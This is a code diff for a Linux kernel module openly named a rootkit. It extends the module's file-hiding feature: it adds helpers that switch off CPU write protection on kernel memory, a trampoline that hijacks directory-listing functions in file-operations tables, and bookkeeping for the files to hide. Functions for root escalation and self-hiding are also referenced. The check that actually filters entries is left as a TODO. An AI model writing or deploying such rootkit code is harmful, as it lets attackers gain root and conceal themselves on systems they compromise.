@@ -14,20 +14,53 @@ MODULE_VERSION("1.0");
 
 #define log(...) printk(KERN_INFO "rootkit: " __VA_ARGS__)
 
-// Hook state, used for trampoline and restoring
-// original function
+typedef int (*iterate_fn)(struct file *, struct dir_context *);
+
+// File ops hook state, used for trampoline and restoring
+// original function. These must be unique, to prevent
+// double-hooking (which causes infinite loops).
 struct fops_hook {
     struct list_head list;
     struct file_operations *fops;
-    int (*iterate_orig)(struct file *, struct dir_context *);
-    int (*iterate_shared_orig)(struct file *, struct dir_context *);
+    iterate_fn iterate_orig;
+    iterate_fn iterate_shared_orig;
+};
+
+// File hook state. dir_inode is the parent directory, file_name
+// is the thing we're going to filter out.
+struct file_hook {
+    struct list_head list;
+    unsigned long dir_inode;
+    char file_name[256];
+};
+
+struct dir_context_wrapper {
+    struct dir_context hook;
+    struct dir_context *orig;
 };
 
 // Keeps track of all the files we've hidden
 LIST_HEAD(fops_hook_list);
+LIST_HEAD(file_hook_list);
 
 // Buffer for copying strings into the kernel
 static char cmd_buf[128];
+
+// Enables writing to read-only pages.
+static void yolo_begin(void)
+{
+    preempt_disable();
+    barrier();
+    write_cr0(read_cr0() & ~X86_CR0_WP);
+}
+
+// Disables writing to read-only pages.
+static void yolo_end(void)
+{
+    write_cr0(read_cr0() | X86_CR0_WP);
+    barrier();
+    preempt_enable();
+}
 
 // Grants the calling process root permissions.
 static int sysctl_escalate(void)
@@ -67,45 +100,69 @@ static int sysctl_hide_self(void)
     return 0;
 }
 
-static int iterate_hook(struct file *file, struct dir_context *context)
+static int filldir_hook(
+    struct dir_context *context,
+    const char *name,
+    int name_len,
+    loff_t offset,
+    uint64_t ino,
+    unsigned int d_type)
+{
+    struct dir_context_wrapper *hook_context;
+    hook_context = container_of(context, struct dir_context_wrapper, hook);
+
+    // Check if we should hide this entry
+    // TODO
+
+    // We don't care about it, restore original behavior
+    int ret = hook_context->orig->actor(hook_context->orig, name, name_len, offset, ino, d_type);
+    context->pos = hook_context->orig->pos;
+    return ret;
+}
+
+static struct fops_hook *get_iterate_hook(struct file *file)
 {
     struct list_head *curr;
-
-    log("fops->iterate() hook\n");
-
-    // Super lame trampoline: find the hook corresponding to this
-    // file type, and call the original iterate function.
     list_for_each(curr, &fops_hook_list) {
         struct fops_hook *hook = list_entry(curr, struct fops_hook, list);
         if (hook->fops == file->f_op) {
-            if (hook->iterate_shared_orig) {
-                return hook->iterate_shared_orig(file, context);
-            } else if (hook->iterate_orig) {
-                return hook->iterate_orig(file, context);
-            } else {
-                BUG();
-            }
+            return hook;
         }
     }
-
-    // Should never reach this point
     BUG();
 }
 
-// Enables writing to read-only pages.
-static void yolo_begin(void)
+static int iterate_hook(struct file *file, struct dir_context *context)
 {
-    preempt_disable();
-    barrier();
-    write_cr0(read_cr0() & ~X86_CR0_WP);
-}
+    struct dir_context_wrapper hook_context = {
+        .hook = {
+            .actor = filldir_hook,
+            .pos = context->pos,
+        },
+        .orig = context,
+    };
+    struct fops_hook *hook = get_iterate_hook(file);
 
-// Disables writing to read-only pages.
-static void yolo_end(void)
-{
-    write_cr0(read_cr0() | X86_CR0_WP);
-    barrier();
-    preempt_enable();
+    yolo_begin();
+    hook->fops->iterate = hook->iterate_orig;
+    hook->fops->iterate_shared = hook->iterate_shared_orig;
+    yolo_end();
+
+    int ret;
+    if (hook->fops->iterate_shared != NULL) {
+        ret = hook->fops->iterate_shared(file, &hook_context.hook);
+    } else if (hook->fops->iterate != NULL) {
+        ret = hook->fops->iterate(file, &hook_context.hook);
+    } else {
+        BUG();
+    }
+
+    yolo_begin();
+    hook->fops->iterate = iterate_hook;
+    hook->fops->iterate_shared = NULL;
+    yolo_end();
+
+    return ret;
 }
 
 // Hides a file. The file may still be opened, but
@@ -116,23 +173,12 @@ static int sysctl_hide_file(const char *path)
 {
     int ret = -1;
     struct file *f;
-    struct fops_hook *hook = NULL;
-    struct file_operations *fops;
+    struct fops_hook *fops_hook = NULL;
+    struct file_hook *file_hook = NULL;
+    struct file_operations *fops = NULL;
+    struct dentry *file_dentry, *parent_dentry;
 
     log("Hiding file: %s\n", path);
-
-#if 0
-    char parent_path[PATH_MAX];
-    if (strscpy(parent_path, path, sizeof(parent_path)) < 0) {
-        log("Path too long: %s\n", path);
-        return -1;
-    }
-
-    char *last_segment = strrchr(parent_path);
-    if (last_segment == NULL) {
-        log("Path too short\n");
-    }
-#endif
 
     // Open the file so we can get its file ops table
     f = filp_open(path, O_RDONLY, 0);
@@ -141,46 +187,76 @@ static int sysctl_hide_file(const char *path)
         goto cleanup;
     }
 
-    hook = kmalloc(sizeof(*hook), GFP_KERNEL);
-    if (hook == NULL) {
-        log("Failed to allocate hook struct\n");
-        goto cleanup;
-    }
-
-    fops = (struct file_operations *)f->f_op;
+    // Retrieve file details
+    file_dentry = f->f_path.dentry;
+    parent_dentry = file_dentry->d_parent;
+    fops = (struct file_operations *)fops_get(parent_dentry->d_inode->i_fop);
     if (fops->iterate_shared == NULL && fops->iterate == NULL) {
         log("Parent path is not iterable\n");
         goto cleanup;
     }
 
-    // Save iterate function (used by getdents, which in turn
-    // is used by readdir, which in turn is used by ls) in the
-    // file ops table. Need to enable #YOLO mode, since file ops
-    // tables are usually declared const.
-    hook->fops = fops;
-    hook->iterate_shared_orig = fops->iterate_shared;
-    hook->iterate_orig = fops->iterate;
+    file_hook = kmalloc(sizeof(*file_hook), GFP_KERNEL);
+    if (file_hook == NULL) {
+        log("Failed to allocate hook\n");
+        goto cleanup;
+    }
 
-    // Replace iterate and iterate_shared with our hacked version.
-    // Note that iterate is the same as iterate_shared, but the
-    // caller acquires the protecting semaphore in r/w mode instead
-    // of r/o mode, so it's always safe to replace iterate with
-    // iterate_shared (but not the other way around).
-    yolo_begin();
-    fops->iterate = iterate_hook;
-    fops->iterate_shared = NULL;
-    yolo_end();
+    file_hook->dir_inode = parent_dentry->d_inode->i_ino;
+    if (strscpy(file_hook->file_name, file_dentry->d_name.name, sizeof(file_hook->file_name)) < 0) {
+        log("File name too long\n");
+        goto cleanup;
+    }
 
-    // Add hook into list (must come last, unless you want to
-    // remove it in cleanup for whatever reason)
-    list_add(&hook->list, &fops_hook_list);
+    // This is a pretty hacky operation, so for safety we attempt
+    // this last, after everything else has already succeeded.
+    if (fops->iterate != iterate_hook) {
+        // Allocate hook state to put into list
+        fops_hook = kmalloc(sizeof(*fops_hook), GFP_KERNEL);
+        if (fops_hook == NULL) {
+            log("Failed to allocate hook struct\n");
+            goto cleanup;
+        }
+
+        // Save iterate function (used by getdents, which in turn
+        // is used by readdir, which in turn is used by ls) in the
+        // file ops table. Need to enable #YOLO mode, since file ops
+        // tables are usually declared const.
+        fops_hook->fops = fops;
+        fops_hook->iterate_shared_orig = fops->iterate_shared;
+        fops_hook->iterate_orig = fops->iterate;
+
+        // Replace iterate and iterate_shared with our hacked version.
+        // Note that iterate is the same as iterate_shared, but the
+        // caller acquires the protecting semaphore in r/w mode instead
+        // of r/o mode, so it's always safe to replace iterate with
+        // iterate_shared (but not the other way around).
+        yolo_begin();
+        fops->iterate = iterate_hook;
+        fops->iterate_shared = NULL;
+        yolo_end();
+
+        // Add hook into list (must come last, unless you want to
+        // remove it in cleanup for whatever reason)
+        list_add(&fops_hook->list, &fops_hook_list);
+    }
+
+    list_add(&file_hook->list, &file_hook_list);
 
     ret = 0;
 
 cleanup:
     if (ret < 0) {
-        if (hook != NULL) {
-            kfree(hook);
+        if (fops_hook != NULL) {
+            kfree(fops_hook);
+        }
+
+        if (file_hook != NULL) {
+            kfree(file_hook);
+        }
+
+        if (fops != NULL) {
+            fops_put(fops);
         }
     }
 
@@ -328,8 +404,15 @@ static void __exit rootkit_exit(void)
         hook->fops->iterate = hook->iterate_orig;
         hook->fops->iterate_shared = hook->iterate_shared_orig;
         yolo_end();
+        fops_put(hook->fops);
 
         // Delete from list
+        list_del(curr);
+        kfree(hook);
+    }
+
+    list_for_each_safe(curr, n, &file_hook_list) {
+        struct file_hook *hook = list_entry(curr, struct file_hook, list);
         list_del(curr);
         kfree(hook);
     }
